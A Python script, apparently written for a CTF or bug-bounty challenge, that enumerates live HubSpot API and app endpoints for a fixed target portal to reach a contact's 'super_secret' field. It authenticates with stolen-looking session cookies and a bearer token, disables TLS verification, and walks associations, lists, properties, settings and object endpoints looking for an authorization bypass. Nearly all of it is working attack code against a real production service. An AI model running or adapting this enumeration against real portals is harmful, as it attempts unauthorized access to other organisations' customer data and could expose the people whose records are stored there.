#!/usr/bin/env python3
"""
Alternative Object Access - Try accessing contact data through different object types
Testing: Companies, deals, engagements, activities, sequences, lists
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'
CONTACT_ID = '1'

print("="*80)
print("ALTERNATIVE OBJECT ACCESS METHODS")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. ENGAGEMENTS / ACTIVITIES API
# ============================================================================

print("\n[1] TESTING ENGAGEMENTS / ACTIVITIES")
print("="*80)

# Try to get engagements associated with contact 1
engagement_urls = [
    f'https://api.hubapi.com/engagements/v1/engagements/associated/CONTACT/{CONTACT_ID}/paged?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/{CONTACT_ID}/associations/engagements?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/engagements',
]

for url in engagement_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")

                if 'firstname' in json.dumps(data).lower() or 'super_secret' in json.dumps(data).lower():
                    findings.append({'type': 'engagement', 'url': url, 'data': data})
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 2. ASSOCIATIONS API - Get associated objects
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING ASSOCIATIONS API")
print("="*80)

# Try to get companies, deals associated with contact 1
association_types = [
    ('companies', '0-1', '0-2'),  # Contact to Company
    ('deals', '0-1', '0-3'),      # Contact to Deal
    ('tickets', '0-1', '0-5'),    # Contact to Ticket
]

for obj_name, from_type, to_type in association_types:
    urls = [
        f'https://api.hubapi.com/crm/v3/objects/contacts/{CONTACT_ID}/associations/{obj_name}?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/crm/v4/associations/{from_type}/{to_type}/batch/read',
    ]

    for url in urls:
        print(f"\n{url[:75]}...")

        try:
            if 'batch/read' in url:
                # POST request for batch
                payload = {'inputs': [{'id': CONTACT_ID}]}
                r = requests.post(url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
            else:
                # GET request
                r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  *** ACCESSIBLE! ***")
                try:
                    data = r.json()
                    print(f"  {json.dumps(data, indent=2)[:400]}")

                    # If we found associated objects, try to fetch them
                    if 'results' in data and data['results']:
                        print(f"  Found {len(data['results'])} associated {obj_name}")

                        # Try to fetch the associated object which might contain contact info
                        for result in data['results'][:3]:
                            assoc_id = result.get('id') or result.get('toObjectId')
                            if assoc_id:
                                print(f"\n  Fetching associated {obj_name[:-1]} {assoc_id}...")

                                assoc_url = f'https://api.hubapi.com/crm/v3/objects/{obj_name}/{assoc_id}?portalId={TARGET_PORTAL}&properties=all'
                                r2 = session.get(assoc_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

                                if r2.status_code == 200:
                                    try:
                                        assoc_data = r2.json()
                                        print(f"    {json.dumps(assoc_data, indent=2)[:300]}")
                                    except:
                                        pass
                except:
                    pass
        except:
            pass

# ============================================================================
# 3. SEQUENCES / SALES EMAILS
# ============================================================================

print("\n" + "="*80)
print("[3] TESTING SEQUENCES")
print("="*80)

sequence_urls = [
    f'https://api.hubapi.com/sales/v1/sequences?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/sequences/{TARGET_PORTAL}',
]

for url in sequence_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 4. LISTS API - Try to create a list with contact 1
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING LISTS API")
print("="*80)

# Try to get existing lists
lists_urls = [
    f'https://api.hubapi.com/contacts/v1/lists?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists',
]

for url in lists_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                # If we found lists, try to get contacts from them
                if 'lists' in data:
                    for lst in data['lists'][:3]:
                        list_id = lst.get('listId')
                        if list_id:
                            print(f"\n  Getting contacts from list {list_id}...")

                            contacts_url = f'https://api.hubapi.com/contacts/v1/lists/{list_id}/contacts/all?portalId={TARGET_PORTAL}&property=firstname&property=super_secret'
                            r2 = session.get(contacts_url, verify=False, timeout=5)

                            if r2.status_code == 200:
                                try:
                                    contacts_data = r2.json()
                                    print(f"    {json.dumps(contacts_data, indent=2)[:400]}")

                                    if 'super_secret' in json.dumps(contacts_data).lower():
                                        findings.append({'type': 'list_contacts', 'list_id': list_id, 'data': contacts_data})
                                except:
                                    pass
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 5. PROPERTIES API - Direct property access
# ============================================================================

print("\n" + "="*80)
print("[5] TESTING PROPERTY VALUES API")
print("="*80)

# Try to get property values directly
property_urls = [
    f'https://api.hubapi.com/crm/v3/properties/contacts?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/properties/v1/contacts/properties?portalId={TARGET_PORTAL}',
]

for url in property_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:500]}")

                # Check if super_secret property details are there
                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n  *** Found super_secret property! ***")

                    # Look for property definition
                    for result in data.get('results', []):
                        if result.get('name', '').lower() == 'super_secret':
                            print(f"  Property definition: {json.dumps(result, indent=2)}")
            except:
                pass
    except:
        pass

# ============================================================================
# 6. SETTINGS / ACCOUNT INFO
# ============================================================================

print("\n" + "="*80)
print("[6] TESTING SETTINGS / ACCOUNT API")
print("="*80)

settings_urls = [
    f'https://api.hubapi.com/settings/v3/users?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/integrations/v1/{TARGET_PORTAL}/settings',
    f'https://app.hubspot.com/settings/{TARGET_PORTAL}/general',
    f'https://app.hubspot.com/settings/{TARGET_PORTAL}/users',
]

for url in settings_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")
            except:
                print(f"  Size: {len(r.text)} bytes")
    except:
        pass

# ============================================================================
# 7. GENERIC OBJECTS API
# ============================================================================

print("\n" + "="*80)
print("[7] TESTING GENERIC OBJECTS API")
print("="*80)

objects_urls = [
    f'https://api.hubapi.com/crm/v3/objects/0-1/{CONTACT_ID}?portalId={TARGET_PORTAL}&properties=firstname,super_secret',
    f'https://api.hubapi.com/crm/v3/objects/contacts/{CONTACT_ID}?portalId={TARGET_PORTAL}&properties=firstname,super_secret&idProperty=hs_object_id',
]

for url in objects_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUCCESS! ***")
            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)}")

                if 'super_secret' in json.dumps(data).lower():
                    findings.append({'type': 'objects_api', 'url': url, 'data': data})
            except:
                pass
    except:
        pass

print("\n" + "="*80)
print("ALTERNATIVE OBJECT ACCESS COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA SOURCES! ***\n")

    with open('/home/user/Hub/findings/alternative_access_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** CTF FLAG FOUND! ***")
else:
    print("\nNo alternative access methods successful.")
